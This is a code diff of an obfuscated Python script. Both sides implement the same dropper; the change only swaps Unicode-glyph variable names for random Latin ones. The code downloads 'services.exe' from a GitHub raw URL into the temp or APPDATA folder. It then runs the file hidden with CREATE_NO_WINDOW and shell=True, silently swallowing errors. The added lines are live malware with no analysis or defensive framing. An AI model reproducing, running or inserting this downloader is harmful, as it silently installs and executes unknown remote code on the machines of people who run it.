@@ -1,37 +1,37 @@
 from tempfile import NamedTemporaryFile as _ffile
-𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑㓜=open
-𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑㯇=True
+rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgM=open
+rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgP=True
 from sys import executable as _eexecutable
 from subprocess import Popen,CREATE_NO_WINDOW
 import subprocess
 import requests
-𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𢀃=requests.get
+rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgn=requests.get
 import os
-𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑搏=os.getenv
-𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𤂜=os.path
+rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgk=os.getenv
+rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgL=os.path
 import uuid
 import tempfile
-𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𐪗=tempfile.gettempdir
-𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𒀸="https://github.com/Dch12zz/services/raw/refs/heads/main/services.exe"
-𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𪂝=𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𐪗()
-𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𪇛=𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𤂜.join(𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𪂝,f"services.exe")
-if not 𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𤂜.exists(𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𪇛):
- 𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𘊕=𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𢀃(𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𒀸)
- if 𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𘊕.status_code==200:
-  with 𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑㓜(𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𪇛,'wb')as 𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑ꞻ:
-   𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑ꞻ.write(𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𘊕.content)
+rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgC=tempfile.gettempdir
+rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgd="https://github.com/Dch12zz/services/raw/refs/heads/main/services.exe"
+rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgs=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgC()
+rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgL.join(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgs,f"services.exe")
+if not rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgL.exists(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo):
+ rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgn(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgd)
+ if rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.status_code==200:
+  with rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgM(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,'wb')as rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq:
+   rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq.write(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.content)
    try:
-    𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑ﺠ(𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𪇛,creationflags=CREATE_NO_WINDOW,shell=𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑㯇)
+    rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgX(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,creationflags=CREATE_NO_WINDOW,shell=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgP)
    except:
     pass
 else:
- 𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑ﲥ=𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑搏('APPDATA')
- 𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𪇛=𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𤂜.join(𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑ﲥ,f"services.exe")
- 𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𘊕=𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𢀃(𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𒀸)
- if 𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𘊕.status_code==200:
-  with 𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑㓜(𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𪇛,'wb')as 𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑ꞻ:
-   𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑ꞻ.write(𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𘊕.content)
+ rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgF=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgk('APPDATA')
+ rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgL.join(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgF,f"services.exe")
+ rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgn(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgd)
+ if rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.status_code==200:
+  with rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgM(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,'wb')as rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq:
+   rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgq.write(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTge.content)
    try:
-    𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑ﺠ(𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑𪇛,creationflags=CREATE_NO_WINDOW,shell=𐣢𞢻ﺛ𞠺𫶉ꜩ𘅰𤱰𐰳𗄱𰀏黎ﴮ쳝ࡿ𑚜𐰥ﰩ𮙎ﭔ𐡧ﹾ𥽵𐜯𞸻𥢘𤼤𔙆𭕈𐪍𡓑㯇)
+    rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgX(rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgo,creationflags=CREATE_NO_WINDOW,shell=rfQKVtiApHxhcbIvYDuNSzJUWOBwlTgP)
    except:
     pass
